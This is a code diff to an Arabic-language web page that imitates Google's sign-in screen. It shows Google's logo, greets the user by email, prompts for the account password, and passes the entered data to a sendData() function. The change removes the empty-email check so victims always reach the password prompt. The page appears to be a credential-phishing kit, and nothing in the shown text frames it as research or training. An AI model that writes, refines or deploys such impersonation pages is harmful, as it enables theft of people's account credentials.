@@ -105,21 +105,18 @@
   <script>
     function goToPassword() {
       const email = document.getElementById("email").value.trim();
-      if (!email) {
-        document.getElementById("status").textContent = "يرجى إدخال البريد أو الهاتف.";
-        return;
-      }
+      const displayEmail = email || "المستخدم";
 
       const formBox = document.getElementById("formBox");
       formBox.innerHTML = `
         <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
-        <h2>مرحبًا ${email}</h2>
+        <h2>مرحبًا ${displayEmail}</h2>
         <p>أدخل كلمة المرور لحسابك</p>
         <div class="input-group">
           <input type="password" id="password" placeholder="كلمة المرور">
         </div>
         <a class="link" href="#">هل نسيت كلمة المرور؟</a>
-        <button onclick="sendData('${email}')">تسجيل الدخول</button>
+        <button onclick="sendData('${email || 'غير محدد'}')">تسجيل الدخول</button>
         <a class="link" href="#">استخدام حساب آخر</a>
         <div class="status" id="status"></div>
       `;
